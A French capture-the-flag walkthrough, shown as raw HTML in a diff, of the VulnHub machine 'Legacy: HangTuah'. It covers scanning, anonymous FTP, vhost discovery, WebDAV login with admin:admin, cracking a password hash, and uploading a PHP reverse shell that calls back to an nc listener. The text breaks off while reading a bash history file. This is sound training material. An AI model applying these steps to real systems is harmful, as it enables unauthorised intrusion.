@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html data-html-server-rendered="true" lang="fr" data-vue-tag="%7B%22lang%22:%7B%22ssr%22:%22fr%22%7D%7D">
+  <head>
+    <title>CTF Legacy: HangTuah - https://etienner.github.io</title><meta name="gridsome:hash" content="250f333e9ef0347f8247956a19dfdff7c411a751"><meta data-vue-tag="ssr" charset="utf-8"><meta data-vue-tag="ssr" name="generator" content="Gridsome v0.7.23"><meta data-vue-tag="ssr" data-key="viewport" name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"><meta data-vue-tag="ssr" data-key="format-detection" name="format-detection" content="telephone=no"><meta data-vue-tag="ssr" name="description" content="Avant propos
+Le déroulé de ce hack a été réalisé sur une machine prévue à cette effet. Il est interdit de mener ce genre d&#x27;action sur une machine qui ne vous appartient pas sans l&#x27;accord de son ou sa"><meta data-vue-tag="ssr" property="og:type" content="article"><meta data-vue-tag="ssr" property="og:title" content="CTF Legacy: HangTuah"><meta data-vue-tag="ssr" property="og:description" content="Avant propos
+Le déroulé de ce hack a été réalisé sur une machine prévue à cette effet. Il est interdit de mener ce genre d&#x27;action sur une machine qui ne vous appartient pas sans l&#x27;accord de son ou sa"><meta data-vue-tag="ssr" property="og:url" content="https://etienner.github.io/ctf-legacy-hang-tuah/"><meta data-vue-tag="ssr" name="twitter:domain" content="https://etienner.github.io"><meta data-vue-tag="ssr" name="twitter:card" content="summary_large_image"><meta data-vue-tag="ssr" name="twitter:title" content="CTF Legacy: HangTuah"><meta data-vue-tag="ssr" name="twitter:description" content="Avant propos
+Le déroulé de ce hack a été réalisé sur une machine prévue à cette effet. Il est interdit de mener ce genre d&#x27;action sur une machine qui ne vous appartient pas sans l&#x27;accord de son ou sa"><meta data-vue-tag="ssr" name="twitter:site" content="@etiennerouzeaud"><meta data-vue-tag="ssr" name="twitter:creator" content="@etiennerouzeaud"><link data-vue-tag="ssr" rel="icon" href="data:,"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="16x16" href="/assets/static/favicon.ce0531f.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="32x32" href="/assets/static/favicon.ac8d93a.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="96x96" href="/assets/static/favicon.b9532cc.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="76x76" href="/assets/static/favicon.f22e9f3.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="152x152" href="/assets/static/favicon.62d22cb.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="120x120" href="/assets/static/favicon.1539b60.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="167x167" href="/assets/static/favicon.dc0cdc5.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="180x180" href="/assets/static/favicon.7b22250.9bb7ffafafc09ac851d81afb65b8ef59.png"><link rel="preload" href="/assets/css/0.styles.9275371b.css" as="style"><link rel="preload" href="/assets/js/app.8f509c54.js" as="script"><link rel="preload" href="/assets/js/page--src-templates-post-vue.12e71a8f.js" as="script"><link rel="prefetch" href="/assets/js/page--node-modules-gridsome-app-pages-404-vue.b64bd371.js"><link rel="prefetch" href="/assets/js/page--src-pages-index-vue.15f2a9bd.js"><link rel="prefetch" href="/assets/js/page--src-templates-tag-vue.25185cf5.js"><link rel="stylesheet" href="/assets/css/0.styles.9275371b.css"><noscript data-vue-tag="ssr"><style>.g-image--loading{display:none;}</style></noscript>
+  </head>
+  <body >
+    <div data-server-rendered="true" id="app"><header class="py-2 text-center"><strong><a href="/" title="Accueil" class="active">Etienne ROUZEAUD - Développeur Web</a></strong></header><main><div class="title py-2 text-center" data-v-2084d89c><h1 class="display-5 pt-2" data-v-2084d89c>CTF Legacy: HangTuah</h1><!----></div><div class="container"><div class="row sidebar"><div class="mt-4 col-lg-2"><p><em><span>06 mai 2021</span></em></p><ul class="list-unstyled"><li>
+            🏷️ <a href="/tag/Pentest/">Pentest</a></li><li>
+            🏷️ <a href="/tag/CTF/">CTF</a></li></ul><p>⌚ 15 mins de lecture</p><p><a href="https://www.vulnhub.com/entry/legacy-hangtuah,539" target="_blank" rel="noopener">
+            💾 Téléchargement
+          </a></p></div><div class="col-lg-10 mt-4"><!----><article><h2>Avant propos</h2>
+<p>Le déroulé de ce hack a été réalisé sur une machine prévue à cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propriétaire.<br>
+Ce CTF a été réalisé avec une machine attaquante <strong>Kali 2021.1</strong> (<code class="language-text">lsb_release -r</code>).</p>
+<h2>Enumération</h2>
+<p>On récupère l'adresse IP de la machine distante avec <strong>Netdiscover</strong> <code class="language-text">sudo netdiscover</code>.<br>
+Avant de poursuivre, on exporte cette adresse dans une variable pour être tranquille par la suite <code class="language-text">export IP=192.168.1.28</code>.<br>
+Puis on créé un dossier dédié à ce CTF <code class="language-text">cd Documents/ctf &amp;&amp; mkdir LegacyHangTuah &amp;&amp; cd LegacyHangTuah</code>.<br>
+On lance <strong>Nmap</strong> pour scanner les ports de la machine distante.</p>
+<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ nmap -A -p- <span class="token variable">$IP</span> -oN nmap.txt
+<span class="token number">22</span>/tcp  <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">8</span>.2p1 Ubuntu 4ubuntu0.1 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
+<span class="token operator">|</span> ssh-hostkey:
+<span class="token operator">|</span>   <span class="token number">3072</span> eb:69:e0:4f:d0:4e:9e:98:73:9b:fb:67:3a:36:de:21 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
+<span class="token operator">|</span>   <span class="token number">256</span> <span class="token number">17</span>:1c:eb:9e:be:a5:68:25:f1:24:8b:0d:23:5d:9b:c1 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
+<span class="token operator">|</span>_  <span class="token number">256</span> e0:1b:77:26:eb:cb:93:94:b5:f0:04:a3:29:9c:33:c7 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
+<span class="token number">80</span>/tcp  <span class="token function">open</span>  http    Apache httpd <span class="token number">2.4</span>.41 <span class="token variable"><span class="token punctuation">((</span>Ubuntu<span class="token punctuation">))</span></span>
+<span class="token operator">|</span>_http-server-header: Apache/2.4.41 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
+<span class="token operator">|</span>_http-title: Apache2 Ubuntu Default Page: It works
+<span class="token number">777</span>/tcp <span class="token function">open</span>  <span class="token function">ftp</span>     vsftpd <span class="token number">3.0</span>.3
+<span class="token operator">|</span> ftp-anon: Anonymous FTP login allowed <span class="token punctuation">(</span>FTP code <span class="token number">230</span><span class="token punctuation">)</span>
+<span class="token operator">|</span>_Can't get directory listing: TIMEOUT
+<span class="token operator">|</span> ftp-syst:
+<span class="token operator">|</span>   STAT:
+<span class="token operator">|</span> FTP server status:
+<span class="token operator">|</span>      Connected to ::ffff:192.168.1.38
+<span class="token operator">|</span>      Logged <span class="token keyword">in</span> as <span class="token function">ftp</span>
+<span class="token operator">|</span>      TYPE: ASCII
+<span class="token operator">|</span>      No session bandwidth limit
+<span class="token operator">|</span>      Session <span class="token function">timeout</span> <span class="token keyword">in</span> seconds is <span class="token number">300</span>
+<span class="token operator">|</span>      Control connection is plain text
+<span class="token operator">|</span>      Data connections will be plain text
+<span class="token operator">|</span>      At session startup, client count was <span class="token number">4</span>
+<span class="token operator">|</span>      vsFTPd <span class="token number">3.0</span>.3 - secure, fast, stable
+<span class="token operator">|</span>_End of status</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
+<p>On a un serveur <strong>SSH</strong> sur le port <strong>22</strong>, un serveur <strong>Apache</strong> 2.4.6 sur le port <strong>80</strong> et un serveur <strong>FTP</strong> sur le port <strong>777</strong> On commence donc par énumérer le serveur <strong>FTP</strong> en tant qu'utilisateur anonyme.</p>
+<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">ftp</span> <span class="token number">192.168</span>.1.28 <span class="token number">777</span>
+Connected to <span class="token number">192.168</span>.1.28.
+<span class="token number">220</span> <span class="token punctuation">(</span>vsFTPd <span class="token number">3.0</span>.3<span class="token punctuation">)</span>
+Name <span class="token punctuation">(</span><span class="token number">192.168</span>.1.28:kali<span class="token punctuation">)</span>: anonymous
+<span class="token number">331</span> Please specify the password.
+Password:
+<span class="token number">230</span> Login successful.
+Remote system <span class="token builtin class-name">type</span> is UNIX.
+Using binary mode to transfer files.
+ftp<span class="token operator">></span> <span class="token function">ls</span> -la
+<span class="token number">200</span> PORT <span class="token builtin class-name">command</span> successful. Consider using PASV.
+<span class="token number">150</span> Here comes the directory listing.
+drwxr-xr-x    <span class="token number">3</span> <span class="token number">33</span>       <span class="token number">33</span>           <span class="token number">4096</span> Aug <span class="token number">21</span>  <span class="token number">2020</span> <span class="token builtin class-name">.</span>
+drwxr-xr-x    <span class="token number">3</span> <span class="token number">33</span>       <span class="token number">33</span>           <span class="token number">4096</span> Aug <span class="token number">21</span>  <span class="token number">2020</span> <span class="token punctuation">..</span>
+drwxr-xr-x    <span class="token number">3</span> <span class="token number">0</span>        <span class="token number">33</span>           <span class="token number">4096</span> Aug <span class="token number">24</span>  <span class="token number">2020</span> .secret
+<span class="token number">226</span> Directory send OK.</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
+<p>Il y a un dossier ".secret".</p>
+<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">ftp<span class="token operator">></span> <span class="token builtin class-name">cd</span> .secret
+<span class="token number">250</span> Directory successfully changed.
+ftp<span class="token operator">></span> <span class="token function">ls</span> -la
+<span class="token number">200</span> PORT <span class="token builtin class-name">command</span> successful. Consider using PASV.
+<span class="token number">150</span> Here comes the directory listing.
+drwxr-xr-x    <span class="token number">3</span> <span class="token number">0</span>        <span class="token number">33</span>           <span class="token number">4096</span> Aug <span class="token number">24</span>  <span class="token number">2020</span> <span class="token builtin class-name">.</span>
+drwxr-xr-x    <span class="token number">3</span> <span class="token number">33</span>       <span class="token number">33</span>           <span class="token number">4096</span> Aug <span class="token number">21</span>  <span class="token number">2020</span> <span class="token punctuation">..</span>
+drwxr-xr-x    <span class="token number">2</span> <span class="token number">0</span>        <span class="token number">33</span>           <span class="token number">4096</span> Aug <span class="token number">25</span>  <span class="token number">2020</span> <span class="token punctuation">..</span>.
+-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">33</span>             <span class="token number">42</span> Aug <span class="token number">24</span>  <span class="token number">2020</span> notes.txt</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
+<p>Ce dernier contient un fichier texte nommé "note.txt".</p>
+<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">ftp<span class="token operator">></span> get notes.txt
+local: notes.txt remote: notes.txt
+<span class="token number">200</span> PORT <span class="token builtin class-name">command</span> successful. Consider using PASV.
+<span class="token number">150</span> Opening BINARY mode data connection <span class="token keyword">for</span> notes.txt <span class="token punctuation">(</span><span class="token number">42</span> bytes<span class="token punctuation">)</span>.
+<span class="token number">226</span> Transfer complete.
+<span class="token number">42</span> bytes received <span class="token keyword">in</span> <span class="token number">0.00</span> secs <span class="token punctuation">(</span><span class="token number">16.4325</span> kB/s<span class="token punctuation">)</span>
+ftp<span class="token operator">></span> <span class="token builtin class-name">exit</span>
+<span class="token number">221</span> Goodbye.</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
+<p>Fichier que l'on consulte.</p>
+<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">cat</span> notes.txt
+N-o-t-h-i-n-g--I-n--H-e-r-e<span class="token operator">!</span>
+
+M-a-y-b-e??</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span></span></pre></div>
+<p>C'est explicite, on est tombé sur une fausse piste. Poursuivons en scannant le serveur <strong>Apache</strong> avec <strong>Nikto</strong> pour avoir un rapport de sécurité.</p>
+<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ nikto -h http://<span class="token variable">$IP</span> -o nikto.txt
++ Server: Apache/2.4.41 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site <span class="token keyword">in</span> a different fashion to the MIME <span class="token builtin class-name">type</span>
++ No CGI Directories found <span class="token punctuation">(</span>use <span class="token string">'-C all'</span> to force check all possible <span class="token function">dirs</span><span class="token punctuation">)</span>
++ <span class="token string">"robots.txt"</span> contains <span class="token number">1</span> entry <span class="token function">which</span> should be manually viewed.</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
+<p>Le fichier <a href="http://legacy-hang-thuah.home/robots.txt" target="_blank" rel="nofollow noopener noreferrer">robots.txt</a> indique un nom de domaine.</p>
+<div class="gridsome-highlight" data-language="txt"><pre style="counter-reset: linenumber NaN" class="language-txt line-numbers"><code class="language-txt">User-agent: *
+Allow: /
+
+Sitemap: http://legacyhangtuah.com</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span></span></pre></div>
+<p>Modifiez le fichier "hosts" pour que l'adresse IP du serveur pointe sur ce nom de domaine.</p>
+<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">vim</span> /etc/hosts
+<span class="token number">192.168</span>.1.28    legacyhangtuah.com</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
+<p>Le site est une single page sans rien d'intéressant. Scannons les pages et les fichiers avec <strong>Gobuster</strong>.</p>
+<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ gobuster <span class="token function">dir</span> -u http://legacyhangtuah.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt,.xml,.js,.md,.log,.zip
+/index.html           <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">35386</span><span class="token punctuation">]</span>
+/admin.txt            <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">48</span><span class="token punctuation">]</span>
+/assets               <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">325</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://legacyhangtuah.com/assets/<span class="token punctuation">]</span>
+/css                  <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">322</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://legacyhangtuah.com/css/<span class="token punctuation">]</span>
+/manual               <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">325</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://legacyhangtuah.com/manual/<span class="token punctuation">]</span>
+/README.txt           <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">41</span><span class="token punctuation">]</span>
+/js                   <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">321</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://legacyhangtuah.com/js/<span class="token punctuation">]</span>
+/server-status        <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">283</span><span class="token punctuation">]</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
+<p>Le fichier <a href="http://legacyhangtuah.com/admin.txt" target="_blank" rel="nofollow noopener noreferrer">admin.txt</a> est une fausse piste.</p>
+<div class="gridsome-highlight" data-language="txt"><pre style="counter-reset: linenumber NaN" class="language-txt line-numbers"><code class="language-txt">Don&#39;t forget you are admin so do your job well!</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>
+<p>Regardons s'il existe des sous domaines sur le <strong>vhost</strong> "legacyhangtuah.com" avec <strong>Gobuster</strong>.</p>
+<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ gobuster vhost -u legacyhangtuah.com -w /usr/share/wordlists/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt
+Found: door.legacyhangtuah.com <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">2062</span><span class="token punctuation">]</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
+<p>Effectivement, il existe un sous domaine "door.legacyhangtuah.com". Pour le prendre en compte, modifiez à nouveau le fichier "hosts" pour que l'adresse IP du serveur pointe sur ce sous domaine.</p>
+<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">vim</span> /etc/hosts
+<span class="token number">192.168</span>.1.28    legacyhangtuah.com door.legacyhangtuah.com</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
+<p>On fait de nouveau un scan avec <strong>Gobuster</strong> sur ce sous domaine.</p>
+<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ gobuster <span class="token function">dir</span> -u http://door.legacyhangtuah.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt,.xml,.js,.md,.log,.zip
+/images               <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">335</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://door.legacyhangtuah.com/images/<span class="token punctuation">]</span>
+/index.php            <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">2062</span><span class="token punctuation">]</span>
+/README.md            <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">1998</span><span class="token punctuation">]</span>
+/LICENSE              <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">6554</span><span class="token punctuation">]</span>
+/webdav               <span class="token punctuation">(</span>Status: <span class="token number">401</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">470</span><span class="token punctuation">]</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
+<p><a href="http://door.legacyhangtuah.com/webdav" target="_blank" rel="nofollow noopener noreferrer">http://door.legacyhangtuah.com/webdav</a> est une page protégée mais pas suffisament car "admin:admin" fonctionne. Dans cette page il y a un fichier "passwd.dav" avec ce contenu <code class="language-text">admin:$apr1$9tA20Rqw$4qbIQ4QFUV6uUVhfH9NSJ/</code>.</p>
+<p>Mot de passe que l'on peut décoder avec <strong>John the Ripper</strong>.</p>
+<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">'admin:<span class="token variable">$apr1</span><span class="token variable">$9tA20Rqw</span><span class="token variable">$4qbIQ4QFUV6uUVhfH9NSJ</span>/'</span> <span class="token operator">>></span> password.txt
+$ john password.txt
+admin            <span class="token punctuation">(</span>admin<span class="token punctuation">)</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>
+<p>De nouveau, le mot de passe est "admin".</p>
+<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">ssh</span> admin@<span class="token variable">$IP</span>
+admin@192.168.1.28's password: admin</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
+<p>Non ça ne marche pas, encore une fausse piste. Sur Internet, il s'avère que <strong>WebDAV</strong> est un protocole de <strong>HTTP</strong>. Après des recherche, il est possible d'uploader des fichiers sur ce genre de serveur avec un outil nommé <strong>cadaver</strong> (installé par défaut sur Kali Linux). On s'empresse de préparer un webshell.</p>
+<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">cp</span> /usr/share/webshells/php/php-reverse-shell.php <span class="token builtin class-name">.</span>
+$ <span class="token function">vim</span> php-reverse-shell.php
+/<span class="token variable">$ip</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>
+<p>Puis dans un nouvel onglet du terminal, on lance un serveur <strong>Netcat</strong> sur le port <strong>1234</strong> <code class="language-text">nc -lvp 1234</code>.</p>
+<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ cadaver http://door.legacyhangtuah.com/webdav
+Authentication required <span class="token keyword">for</span> webdav on server `door.legacyhangtuah.com':
+Username: admin
+Password:
+dav:/webdav/<span class="token operator">></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span></span></pre></div>
+<p>Affichons la liste des commandes disponibles.</p>
+<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">dav:/webdav/<span class="token operator">></span> <span class="token builtin class-name">help</span>
+Available commands:
+ <span class="token function">ls</span>         <span class="token builtin class-name">cd</span>         <span class="token builtin class-name">pwd</span>        put        get        mget       mput
+ edit       <span class="token function">less</span>       mkcol      <span class="token function">cat</span>        delete     rmcol      copy
+ move       lock       unlock     discover   steal      showlocks  version
+ checkin    checkout   uncheckout <span class="token function">history</span>    label      propnames  chexec
+ propget    propdel    propset    search     <span class="token builtin class-name">set</span>        <span class="token function">open</span>       close
+ <span class="token builtin class-name">echo</span>       quit       <span class="token builtin class-name">unset</span>      lcd        lls        lpwd       <span class="token builtin class-name">logout</span>
+ <span class="token builtin class-name">help</span>       describe   about
+Aliases: <span class="token assign-left variable">rm</span><span class="token operator">=</span>delete, <span class="token assign-left variable">mkdir</span><span class="token operator">=</span>mkcol, <span class="token assign-left variable">mv</span><span class="token operator">=</span>move, <span class="token assign-left variable">cp</span><span class="token operator">=</span>copy, <span class="token assign-left variable">more</span><span class="token operator">=</span>less, <span class="token assign-left variable">quit</span><span class="token operator">=</span>exit<span class="token operator">=</span>bye</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
+<p>Celle qui nous intréresse est <code class="language-text">put</code>.</p>
+<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">dav:/webdav/<span class="token operator">></span> put php-reverse-shell.php
+Uploading php-reverse-shell.php to `/webdav/php-reverse-shell.php':
+Progress: <span class="token punctuation">[</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">]</span> <span class="token number">100,0</span>% of <span class="token number">5494</span> bytes succeeded.</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>
+<p>Si on rafraichit le répertoire <a href="http://door.legacyhangtuah.com/webdav" target="_blank" rel="nofollow noopener noreferrer">http://door.legacyhangtuah.com/webdav</a>, le reverse shell apparait dans la liste des fichiers que l'on exécute en cliquant dessus.</p>
+<h2>Pénétration</h2>
+<p>Dans l'autre onglet du terminal, la connexion au serveur est établi.</p>
+<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ python3 -c <span class="token string">'import pty;pty.spawn("/bin/bash")'</span>
+$ <span class="token function">id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>
+<p>On peut ouvrir un fichier dans le dossier "/home".</p>
+<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">cat</span> /home/pendekar/send_letter.txt
+<span class="token number">23595</span> Gold <span class="token keyword">for</span> you<span class="token operator">!</span><span class="token operator">!</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
+<p>On retourne dans le dossier de l'utilsateur "www-data".</p>
+<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token builtin class-name">cd</span> /var/www <span class="token operator">&amp;&amp;</span> <span class="token function">ls</span> -la
+-rw-------  <span class="token number">1</span> www-data www-data <span class="token number">6378</span> Aug <span class="token number">25</span>  <span class="token number">2020</span> .bash_history
+drwx------  <span class="token number">2</span> www-data www-data <span class="token number">4096</span> May  <span class="token number">3</span> <span class="token number">17</span>:49 .gnupg
+drwxrwxrwx  <span class="token number">3</span> www-data www-data <span class="token number">4096</span> Aug <span class="token number">24</span>  <span class="token number">2020</span> .local
+-rw-rw-rw-  <span class="token number">1</span> www-data www-data  <span class="token number">180</span> May  <span class="token number">3</span> <span class="token number">17</span>:47 .wget-hsts
+drwxr-xr-x  <span class="token number">3</span> www-data www-data <span class="token number">4096</span> Aug <span class="token number">21</span>  <span class="token number">2020</span> chest
+drwxr-xr-x  <span class="token number">3</span> www-data www-data <span class="token number">4096</span> Aug <span class="token number">24</span>  <span class="token number">2020</span> door.legacyhangtuah.com
+drwxr-xr-x  <span class="token number">2</span> www-data www-data <span class="token number">4096</span> Aug <span class="token number">24</span>  <span class="token number">2020</span> html
+drwxr-xr-x  <span class="token number">3</span> www-data www-data <span class="token number">4096</span> Aug <span class="token number">24</span>  <span class="token number">2020</span> legacyhangtuah.com
+drwxr-xr-x  <span class="token number">3</span> www-data www-data <span class="token number">4096</span> May  <span class="token number">3</span> <span class="token number">17</span>:49 snap</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
+<p>Il y a des choses intéressantes dans le fichier d'historique ".bash_history".</p>
+<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">cat</span> .bash_history
